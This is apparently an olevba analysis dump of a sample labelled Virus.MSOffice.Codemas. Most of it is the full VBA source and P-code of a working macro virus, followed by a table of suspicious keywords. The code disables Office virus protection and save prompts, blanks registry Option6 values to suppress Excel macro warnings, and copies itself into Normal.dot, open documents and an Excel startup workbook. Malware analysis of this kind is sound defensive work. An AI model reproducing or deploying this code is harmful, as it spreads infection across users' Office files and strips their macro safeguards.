olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Codemas
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Codemas - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Dim InstMast As Boolean
InstMast = False
With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
End With
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set Code = ThisDocument.VBProject.VBComponents.Item(1)
CodeMast = Code.CodeModule.Lines(1, Code.CodeModule.CountOfLines)
If NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines) <> CodeMast Then
    If NT.CodeModule.CountOfLines > 0 Then
        NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
    End If
    Set fVict = NormalTemplate
    SaveNorm = NormalTemplate.Saved
    InstMast = True
ElseIf AD.CodeModule.Lines(1, CodeMast.CodeModule.CountOfLines) <> CodeMast Then
    If AD.CodeModule.CountOfLines > 0 Then
        AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    End If
    Set fVict = ActiveDocument
    SaveDoc = ActiveDocument.Saved
    InstMast = True
End If
For i = 1 To fVict.VBProject.VBComponents.Count
    If (fVict.VBProject.VBComponents(i).Type <> 100) Then
        Application.OrganizerDelete fVict.FullName, fVict.VBProject.VBComponents(i).Name, wdOrganizerObjectProjectItems
    End If
Next i
DisVirProt
Set xl = CreateObject("Excel.Application")
If UCase(Dir(xl.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
    Set Mastxl = xl.Workbooks.Add
    Mastxl.VBProject.VBComponents("ThisWorkbook").CodeModule.AddFromString CodeMast
    Mastxl.SaveAs FileName:=xl.Application.StartupPath + "\Book1."
End If
xl.Quit
Set Vict = fVict.VBProject.VBComponents.Item(1)
If InstMast = True Then
    Vict.CodeModule.AddFromString CodeMast
    If SaveNorm = True Then NormalTemplate.Save
    If SaveDoc = True Then ActiveDocument.Save
End If
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Set Vict = ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule
Set Code = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule
CodeMast = Code.Lines(1, Code.CountOfLines)
If UCase(Dir(Application.StartupPath & "\Book1.")) <> "BOOK1" Then
    Set xlApp = CreateObject("Excel.Application")
    Set BookMast = xlApp.Workbooks.Add
    BookMast.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, CodeMast.Lines(1, CodeMast.CountOfLines)
    BookMast.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
    xlApp.Quit
End If
    For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
        If ActiveWorkbook.VBProject.VBComponents(i).CodeModule.Find("'Code", 1, 1, 1000, 1000) = False Then
            ActiveWorkbook.VBProject.VBComponents(i).CodeModule.DeleteLines 1, ActiveWorkbook.VBProject.VBComponents(i).CodeModule.CountOfLines
        Addi = ActiveWorkbook.VBProject.VBComponents(i).Name
        If ActiveWorkbook.VBProject.VBComponents(i).Type = 100 Then
            If UCase(Mid((ActiveWorkbook.VBProject.VBComponents(i).Name), 1, 5)) <> "SHEET" Then
                ActiveWorkbook.VBProject.VBComponents(i).CodeModule.InsertLines 1, CodeMast
                If Mid((ActiveWorkbook.Name), 1, 4) <> "Book" Then
                    If ActiveWorkbook.Saved = False Then ActiveWorkbook.Save
                End If
            End If
        End If
        End If
    Next i
Set wd = GetObject(, "Word.Application")
If wd = " " Then
   Set wd = CreateObject("Word.Application")
   wdq = True
End If
For i = 1 To wd.NormalTemplate.VBProject.VBComponents.Count
    Set wdNT = wd.NormalTemplate.VBProject.VBComponents(i)
    If wdNT.Type <> 100 Then
        wd.Application.OrganizerDelete wd.NormalTemplate.FullName, wd.NormalTemplate.VBProject.VBComponents(i).Name, wd.wdOrganizerObjectProjectItems
    ElseIf wdNT.Type = 100 And wdNT.CodeModule.Lines(1, wdNT.CodeModule.CountOfLines) <> CodeMast Then
        wdNT.CodeModule.DeleteLines 1, wdNT.CodeModule.CountOfLines
        wd.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString CodeMast
    End If
Next i
wd.Run "Normal." + wd.NormalTemplate.VBProject.VBComponents.Item(1) + ".DisVirProt"
Set wd = Nothing
If wdq = True Then wd.Quit
End Sub
Private Sub DisVirProt()
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Option6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Option6") = ""
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Option6") = ""
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Codemas
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6927 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn InstMast (As Boolean)
' Line #3:
' 	LitVarSpecial (False)
' 	St InstMast 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #5:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #6:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #7:
' 	EndWith 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Code 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld Code 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Code 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St CodeMast 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld CodeMast 
' 	Ne 
' 	IfBlock 
' Line #13:
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set fVict 
' Line #17:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNorm 
' Line #18:
' 	LitVarSpecial (True)
' 	St InstMast 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld CodeMast 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld CodeMast 
' 	Ne 
' 	ElseIfBlock 
' Line #20:
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set fVict 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDoc 
' Line #25:
' 	LitVarSpecial (True)
' 	St InstMast 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fVict 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #28:
' 	Ld i 
' 	Ld fVict 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #29:
' 	Ld fVict 
' 	MemLd FullName 
' 	Ld i 
' 	Ld fVict 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	ArgsCall DisVirProt 0x0000 
' Line #33:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set xl 
' Line #34:
' 	Ld xl 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #35:
' 	SetStmt 
' 	Ld xl 
' 	MemLd Workbooks 
' 	MemLd Add 
' 	Set Mastxl 
' Line #36:
' 	Ld CodeMast 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld Mastxl 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #37:
' 	Ld xl 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ParamNamed FileName 
' 	Ld Mastxl 
' 	ArgsMemCall SaveAs 0x0001 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld xl 
' 	ArgsMemCall Quit 0x0000 
' Line #40:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld fVict 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Vict 
' Line #41:
' 	Ld InstMast 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #42:
' 	Ld CodeMast 
' 	Ld Vict 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #43:
' 	Ld SaveNorm 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #44:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Vict 
' Line #50:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Code 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld Code 
' 	MemLd CountOfLines 
' 	Ld Code 
' 	ArgsMemLd Lines 0x0002 
' 	St CodeMast 
' Line #52:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "BOOK1"
' 	Ne 
' 	IfBlock 
' Line #53:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set xlApp 
' Line #54:
' 	SetStmt 
' 	Ld xlApp 
' 	MemLd Workbooks 
' 	MemLd Add 
' 	Set BookMast 
' Line #55:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld CodeMast 
' 	MemLd CountOfLines 
' 	Ld CodeMast 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld BookMast 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #56:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld BookMast 
' 	ArgsMemCall SaveAs 0x0003 
' Line #57:
' 	Ld xlApp 
' 	ArgsMemCall Quit 0x0000 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #60:
' 	LitStr 0x0005 "'Code"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #62:
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St Addi 
' Line #63:
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #64:
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Paren 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "SHEET"
' 	Ne 
' 	IfBlock 
' Line #65:
' 	LitDI2 0x0001 
' 	Ld CodeMast 
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #66:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	Paren 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0004 "Book"
' 	Ne 
' 	IfBlock 
' Line #67:
' 	Ld ActiveWorkbook 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set wd 
' Line #74:
' 	Ld wd 
' 	LitStr 0x0001 " "
' 	Eq 
' 	IfBlock 
' Line #75:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set wd 
' Line #76:
' 	LitVarSpecial (True)
' 	St wdq 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld wd 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #79:
' 	SetStmt 
' 	Ld i 
' 	Ld wd 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set wdNT 
' Line #80:
' 	Ld wdNT 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Ne 
' 	IfBlock 
' Line #81:
' 	Ld wd 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	Ld i 
' 	Ld wd 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld wd 
' 	MemLd wdOrganizerObjectProjectItems 
' 	Ld wd 
' 	MemLd Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #82:
' 	Ld wdNT 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	LitDI2 0x0001 
' 	Ld wdNT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld wdNT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld CodeMast 
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #83:
' 	LitDI2 0x0001 
' 	Ld wdNT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld wdNT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #84:
' 	Ld CodeMast 
' 	LitDI2 0x0001 
' 	Ld wd 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	LitStr 0x0007 "Normal."
' 	LitDI2 0x0001 
' 	Ld wd 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Add 
' 	LitStr 0x000B ".DisVirProt"
' 	Add 
' 	Ld wd 
' 	ArgsMemCall Run 0x0001 
' Line #88:
' 	SetStmt 
' 	LitNothing 
' 	Set wd 
' Line #89:
' 	Ld wdq 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wd 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Private Sub DisVirProt())
' Line #92:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0007 "Option6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #93:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0058 "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"
' 	LitStr 0x0007 "Option6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #94:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0047 "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0007 "Option6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #95:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

